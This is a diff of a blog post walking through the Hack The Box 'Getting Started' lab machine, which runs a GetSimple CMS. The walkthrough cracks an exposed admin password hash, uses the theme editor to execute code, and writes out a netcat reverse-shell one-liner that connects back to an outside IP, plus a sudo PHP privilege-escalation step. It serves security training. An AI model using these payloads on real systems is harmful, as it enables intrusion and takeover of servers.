@@ -9,7 +9,6 @@ img_path: /assets/img/posts/
 ![getting started](htb-getting-started-desc.png)
 *Getting started*
 
-
 >In this article we are going to assume the folling ip addresses:
 >
 >Local machine (attacker): 10.0.0.1
@@ -52,19 +51,18 @@ If we take a look at the source code we can see a lot of references to `http://g
 ![http://gettingstarted.htb references](htb-getting-started-getting-started-references.png)
 *http://gettingstarted.htb references*
 
-So we will add `10.0.0.2` as `gettingstarted.htb` to our `/etc/hosts`:
+So we will fixt it adding `10.0.0.2` as `gettingstarted.htb` to our `/etc/hosts`:
 
 ```
 sudo echo `10.0.0.2 gettingstarted.htb` >> /etc/hosts
 ```
 
-Now, the web, looks much better:
+Now, the page, looks much better:
 
 ![welcome screen fixed](htb-getting-started-welcome-screen-fixed.png)
 *Welcome screen fixed*
 
-We can see that we have an instance of a **GetSimple** blog.
-Now, we can start to identify the technologies in use.
+We can see that we have an instance of a **GetSimple** blog and we can start to identify the technologies in use.
 
 ## Technologies in use
 
@@ -75,7 +73,7 @@ http://gettingstarted.htb [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ
 
 ## Directory enumeration
 
-Let's see if there are hidden directories we can check to get more information...
+Let's see if there are hidden directories we can check to get more information:
 
 ```
 $ gobuster dir -u http://gettingstarted.htb --wordlist /usr/share/dirb/wordlists/common.txt
@@ -111,21 +109,50 @@ We can see a few interesting directories, among which stand out `/admin`.
 
 ### /admin
 
-If we browse to the `/admin` directory (`http://gettingstarted.hbt/admin`) we will find a login form:
+If we browse to the `/admin` directory (`http://gettingstarted.htb/admin`) we will find a login form:
 
 ![Admin login form](htb-getting-started-admin-login-form.png)
 *Admin login form*
 
 # Foothold
 
-If we  try a few very basic login/password combinations, in the admin login form, we will end up hitting with `admin/admin`...
+## /data/users/admin.xml
 
-Once we are admin, in the `Supoort`section, we can see interesting information about the `GetSimple` blog and the server setup.
+if we browse to the `/data/users` directory (`http://gettingstarted.htb/data/users`) we will find an `admin.xml` file with the admin account information:
+
+```xml
+<item>
+<USR>admin</USR>
+<NAME/>
+<PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
+<EMAIL>admin@gettingstarted.com</EMAIL>
+<HTMLEDITOR>1</HTMLEDITOR>
+<TIMEZONE/>
+<LANG>en_US</LANG>
+</item>
+```
+
+Here, we have the admin user and hashed pasword.
+As the password is hashed, we need to try to identify the hash used to get the plaintext password:
+
+```
+$ hash-identifier d033e22ae348aeb5660fc2140aec35850c4da997                  
+...
+Possible Hashs:
+[+] SHA-1
+[+] MySQL5 - SHA-1(SHA-1($pass))
+```
+
+Seems that the password is hashed with SHA1.
+We can use some online SHA1 decrypter and we find that the password is "admin".
+
+We have our admin login credentials (user/password): `admin/admin`, so we can log in.
+Once we are logged as admin, in the `Supoort` section, we can see interesting information about the `GetSimple` blog and the server setup.
 
 ![Support information](htb-getting-started-support-information.png)
 *Suppor information*
 
-Now, we have the `GetSimple` version used, and we can search exploits for this version.
+Now, we have the `GetSimple` version used, and we can search exploits for this version:
 
 ```
  searchsploit getsimple       
@@ -161,9 +188,15 @@ Shellcodes: No Results
 We can see one intersting RCE (Remote Code Execution) for metasploit that could work.
 Let's keep this in mind, put aside metasploit, and keep digging a little to try to solve the box without metasploit.
 
+## Files section
+
 Seems that we can upload files from the `Files` section, but does not work.
 
-In the `Theme` section we can edit the `template.php` file, but we can't load this page directly.
+# Remote code execution
+
+## Theme section
+
+In the `Theme` section, under the tab `Edit theme`, we can edit the `template.php` file, but we can't load this page directly.
 Why? Because the code says so.
 Let's see if we can get a command execution here.
 We will comment or delete all code in `template.php` and we will edit the file appending the following php code at the beginning:
@@ -175,8 +208,14 @@ We will comment or delete all code in `template.php` and we will edit the file a
 ![PHP code execution test](htb-getting-started-php-code-execution-test.png)
 *PHP code execution test*
 
-We can curl this file (`http://gettingstarted.htb/theme/Innovation/template.php`), or browse it, and we see that we have a RCE (remote code execution).
-Now, we need to take advantage of this RCE (remote code execution) to convert it in a remote shell.
+We save changes and We can curl this file (`http://gettingstarted.htb/theme/Innovation/template.php`), or browse it, and we see that we have a RCE (remote code execution).
+
+```
+$ curl http://gettingstarted.htb/theme/Innovation/template.php
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+We have a RCE (remote code execution) and we need to take advantage of this RCE (remote code execution) to convert it in a remote shell.
 
 We will edit again the `template.php` file.
 But, this time, we will append the following bash one-liner reverse shell to the beginning:
@@ -191,10 +230,10 @@ But, this time, we will append the following bash one-liner reverse shell to the
 We need to start a netcat listener on our host (the attacker):
 
 ```
-nc -lvnp 1234
+$ nc -lvnp 1234
 ```
 
-We have to curl or browse the `template.php` (`http://gettingstarted.htb/theme/Innovation/template.php`) file, again, to execute the reverse shell.
+We have to curl or browse the `template.php` file (`http://gettingstarted.htb/theme/Innovation/template.php`), again, to execute the reverse shell:
 Now, we have a reverse shell.
 
 ```
@@ -212,11 +251,30 @@ drwxr-xr-x 20 root  root  4096 Feb  9  2021 ..
 drwxr-xr-x  3 mrb3n mrb3n 4096 May  7  2021 mrb3n
 ```
 
-We can read our first flag directly:
+We can see that our fist flag (the `user.txt`) is also world-readable:
+
+```
+$ ls -la /home/mrb3n
+total 40
+drwxr-xr-x 3 mrb3n mrb3n  4096 May  7  2021 .
+drwxr-xr-x 3 root  root   4096 Feb  9  2021 ..
+lrwxrwxrwx 1 mrb3n mrb3n     9 Feb  9  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 mrb3n mrb3n   220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 mrb3n mrb3n  3771 Feb 25  2020 .bashrc
+drwx------ 2 mrb3n mrb3n  4096 Feb  9  2021 .cache
+-rw-r--r-- 1 mrb3n mrb3n   807 Feb 25  2020 .profile
+-rw-r--r-- 1 mrb3n mrb3n     0 Feb  9  2021 .sudo_as_admin_successful
+-rw------- 1 mrb3n mrb3n 10332 May  7  2021 .viminfo
+-rw-rw-r-- 1 mrb3n mrb3n    33 Feb 16  2021 user.txt
+```
+
+So, we can read our first flag directly:
 
 ```
 $ cat /home/mrb3n/user.txt
 ```
+
+# Privilege escalation
 
 Now, we need to escalate privileges in order to get our second flag, the `root.txt`.
 If we check our sudo privileges we will see that we can execute `/usr/bin/php` as root without password:
@@ -230,7 +288,18 @@ User www-data may run the following commands on gettingstarted:
     (ALL : ALL) NOPASSWD: /usr/bin/php
 ```
 
-Since our current directory is writable, we can create a PHP file with a bash one-liner reverse shell:
+Since our current directory (`/var/www/html/theme/Innovation`) is writable, we can create a PHP file with a bash one-liner reverse shell:
+
+```
+$ pwd
+/var/www/html/theme/Innovation
+$ ls -la /var/www/html/theme
+total 16
+drwxr-xr-x 4 www-data www-data 4096 Feb  9  2021 .
+drwxr-xr-x 7 www-data www-data 4096 May  7  2021 ..
+drwxr-xr-x 3 www-data www-data 4096 Sep  7  2018 Cardinal
+drwxr-xr-x 4 www-data www-data 4096 Sep  7  2018 Innovation
+```
 
 ```
 $ echo '<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.201 1235 >/tmp/f"); ?>' > reverse_shell.php
